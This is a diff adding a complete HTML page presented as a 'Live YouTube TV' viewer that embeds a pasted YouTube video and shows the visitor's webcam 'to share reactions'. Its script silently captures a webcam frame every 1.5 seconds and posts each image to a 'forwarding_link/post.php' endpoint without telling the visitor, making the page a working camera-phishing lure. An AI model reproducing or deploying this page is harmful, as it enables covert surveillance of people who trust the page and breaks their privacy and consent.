@@ -1,0 +1,379 @@
+<!doctype html>
+<html>
+<head>
+    <title>Live YouTube TV with Webcam</title>
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: #fff;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            animation: fadeIn 0.8s ease-out;
+            display: none; /* Initially hidden */
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #00dbde, #fc00ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: gradientShift 5s ease infinite;
+            background-size: 200% 200%;
+        }
+        
+        .content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .video-section, .webcam-section {
+            flex: 1;
+            min-width: 300px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .video-section:hover, .webcam-section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        }
+        
+        .section-title {
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            color: #00dbde;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .section-title i {
+            font-size: 1.5rem;
+        }
+        
+        #Live_YT_TV {
+            width: 100%;
+            height: 400px;
+            border-radius: 8px;
+            border: none;
+            background: #000;
+        }
+        
+        .video-wrap {
+            position: relative;
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+        
+        #video {
+            width: 100%;
+            display: block;
+            transform: scaleX(-1);
+            border-radius: 8px;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .status {
+            text-align: center;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+            background: rgba(0,219,222,0.1);
+            color: #00dbde;
+            font-size: 0.9rem;
+            animation: pulse 2s infinite;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            font-size: 0.8rem;
+            color: rgba(255,255,255,0.6);
+        }
+        
+        /* Popup styles */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .popup-content {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+            animation: popIn 0.4s ease-out;
+        }
+        
+        .popup-content h2 {
+            margin-bottom: 20px;
+            color: #00dbde;
+        }
+        
+        .popup-input {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 16px;
+        }
+        
+        .popup-input::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .popup-btn {
+            background: linear-gradient(90deg, #00dbde, #fc00ff);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: transform 0.3s ease;
+        }
+        
+        .popup-btn:hover {
+            transform: translateY(-3px);
+        }
+        
+        .error-message {
+            color: #ff6b6b;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        
+        @keyframes popIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .content {
+                flex-direction: column;
+            }
+            
+            #Live_YT_TV {
+                height: 300px;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Popup for YouTube link -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-content">
+            <h2>Paste YouTube Video Link</h2>
+            <input type="text" class="popup-input" id="ytLinkInput" placeholder="https://www.youtube.com/watch?v=...">
+            <p class="error-message" id="errorMessage">Please paste a valid YouTube video link</p>
+            <button class="popup-btn" id="submitBtn">Load Video</button>
+        </div>
+    </div>
+
+    <!-- Main content (initially hidden) -->
+    <div class="container" id="mainContainer">
+        <div class="header">
+            <h1>Live YouTube TV</h1>
+            <p>Watch live streams while sharing your reactions</p>
+        </div>
+        
+        <div class="content">
+            <div class="video-section">
+                <div class="section-title">
+                    <span>🎥</span>
+                    <h2>Live Stream</h2>
+                </div>
+                <iframe id="Live_YT_TV" src="" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            </div>
+            
+            <div class="webcam-section">
+                <div class="section-title">
+                    <span>📷</span>
+                    <h2>Your Camera</h2>
+                </div>
+                <div class="video-wrap">
+                    <video id="video" playsinline autoplay></video>
+                </div>
+                <div class="status">
+                    Webcam is active 
+                </div>
+                <canvas id="canvas" width="640" height="480"></canvas>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 Live YouTube TV | All streams are property of their respective owners Made By<a href="https://github.com/Bibekbista0406"> Github Bibekbista0406 </a> </p>
+        </div>
+    </div>
+
+    <script>
+        // Handle popup functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            const popupOverlay = document.getElementById('popupOverlay');
+            const mainContainer = document.getElementById('mainContainer');
+            const ytLinkInput = document.getElementById('ytLinkInput');
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const liveYTTV = document.getElementById('Live_YT_TV');
+            
+            submitBtn.addEventListener('click', function() {
+                const link = ytLinkInput.value.trim();
+                
+                if (link) {
+                    // Extract video ID from different YouTube URL formats
+                    let videoId = '';
+                    const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|&v=)([^#&?]*).*/;
+                    const match = link.match(regExp);
+                    
+                    if (match && match[2].length === 11) {
+                        videoId = match[2];
+                        liveYTTV.src = `https://www.youtube.com/embed/${videoId}?autoplay=1`;
+                        
+                        // Hide popup and show main content
+                        popupOverlay.style.display = 'none';
+                        mainContainer.style.display = 'block';
+                        
+                        // Initialize webcam
+                        init();
+                    } else {
+                        errorMessage.style.display = 'block';
+                    }
+                } else {
+                    errorMessage.style.display = 'block';
+                }
+            });
+            
+            // Also allow Enter key to submit
+            ytLinkInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitBtn.click();
+                }
+            });
+        });
+
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    // call the function that handles the response/results
+                },
+                error: function() {
+                }
+            });
+        };
+
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.querySelector('span#errorMsg');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        // Access webcam
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+            }
+        }
+
+        // Success
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
